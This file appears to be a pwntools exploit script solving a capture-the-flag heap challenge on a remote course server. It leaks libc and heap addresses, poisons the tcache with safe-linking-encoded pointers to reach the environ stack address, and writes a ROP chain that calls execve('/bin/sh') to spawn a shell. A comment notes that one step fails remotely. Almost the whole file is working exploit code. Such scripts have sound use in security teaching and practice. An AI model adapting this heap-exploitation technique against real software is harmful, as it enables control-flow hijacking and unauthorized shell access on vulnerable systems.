import os
import string
from itertools import chain
from struct import pack
from typing import Any, Callable, Iterable, List

from pwn import *
from pwnlib.gdb import Gdb

binary = './chal'
context.binary = elf = ELF(binary)
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: [a], args))

breakpoints = [
    # '&main+118', # main RET
    # '&menu+125', # menu RET 
]
print_statements = []
breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)

# LIBC
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

gdbscript = '''
continue
continue
''' + '\n'.join(commands)

# GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.

# with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
    # p: process
    # p.gdb: Gdb

with remote('128.238.62.254',12349) as p:


    is_remote = isinstance(p, remote)
    is_debuggable = not is_remote

    def send_cmd(cmd):
        if type(cmd) == str:
            cmd = cmd.encode()
        elif type(cmd) == int:
            cmd = str(cmd).encode()

        p.sendlineafter(b'>', cmd)

    def add(size: int):
        send_cmd(1)
        p.sendlineafter(b'Size:\n', str(size).encode())

    def delete(idx: int):
        send_cmd(2)
        send_cmd(idx)

    def edit(idx: int, cmd: bytes):
        send_cmd(3)
        send_cmd(idx)
        p.sendlineafter(b'Content:\n', cmd)

    def show(idx: int) -> bytes:
        send_cmd(4)
        send_cmd(idx)
        p.recvuntil(b'Content:\n').decode()
        data = p.recvuntil(b'===').rstrip(b'===')
        log.info("Heap at idx %d: %s", idx, data)
        return data

    def exit():
        send_cmd(5)

    def wait():
        if is_debuggable:
            p.gdb.wait()

    if is_remote:
        p.recvuntil(b'Please input your NetID (something like abc123): ')
        p.sendline(b'nf2137')

    '''
    x/50xg 0x555555559290
    x/32xg &array
    '''

    SIZE = 0x20
    UNSORTED_BIN_SIZE = 0x418

    '''
    Leak LIBC
    '''
    add(UNSORTED_BIN_SIZE) # idx 0
    add(0x50) # idx 1
    delete(0)

    main_arena = u64(show(0)[:8])
    libc_base: int = main_arena - 0x219ce0 # From main arena to libc.so.6 vmmap first entry
    environ: int = libc_base + 0x221200 # From libc to p &environ

    libc.address = libc_base
    elf.libc.address = libc_base

    log.info(f'Main Arena: {hex(main_arena)}')
    log.info(f'LIBC base: {hex(libc_base)}')
    log.info(f'environ: {hex(environ)}')

    '''
    Get Heap leak
    '''
    add(SIZE) # idx 2

    heap_base = u64(show(0)[16:24]) - 0x290 
    log.info(f'Heap: {hex(heap_base)}')

    '''
    Get &environ
    '''
    add(SIZE) # idx 3
    add(SIZE) # idx 4
    delete(4)
    delete(3)
    delete(2)

    curr = heap_base + 0x2d0
    fw = (curr >> 12) ^ environ

    log.info(f'array address (idx 3) for &environ: {hex(curr)}')
    log.info(f'fw &environ: {hex(fw)}')

    # Point to &environ
    # Array idx 6 -> 3
    edit(3, p64(fw))

    '''
    Get environ stack
    '''
    add(SIZE) # idx 5 -> 2
    add(SIZE) # idx 6 -> 3
    add(SIZE) # idx 7: Point to environ stack

    environ_stack = u64(show(7)[:8]) # <--- FAILS remotely
    log.info(f'environ_stack: {hex(environ_stack)}')

    '''
    Clobber Stack
    '''
    BIGGER_SIZE = SIZE * 4
    add(BIGGER_SIZE) # 8
    add(BIGGER_SIZE) # 9 
    add(BIGGER_SIZE) # 10
    delete(10)
    delete(9)
    delete(8)

    curr = heap_base + 0x3c0
    offset_to_rbp_address = 0x128

    fw = (curr >> 12) ^ (environ_stack - offset_to_rbp_address)
    log.info(f'array mem offset (idx 9) for environ {hex(curr)}')
    log.info(f'fw environ stack: {hex(fw)}')

    edit(9, p64(fw))
    add(BIGGER_SIZE) # idx 11 -> 8
    add(BIGGER_SIZE) # idx 12 -> 9
    add(BIGGER_SIZE) # idx 13 -> 10

    '''
    Execute ROP
    '''
    rop = ROP([
        libc
    ])

    bin_sh = next(libc.search(b'/bin/sh\x00'))
    rop.execve(bin_sh, 0, 0)
    log.info(rop.dump())

    edit(13, p64(0xdeadbeef) + rop.chain())
    exit()
    p.interactive()
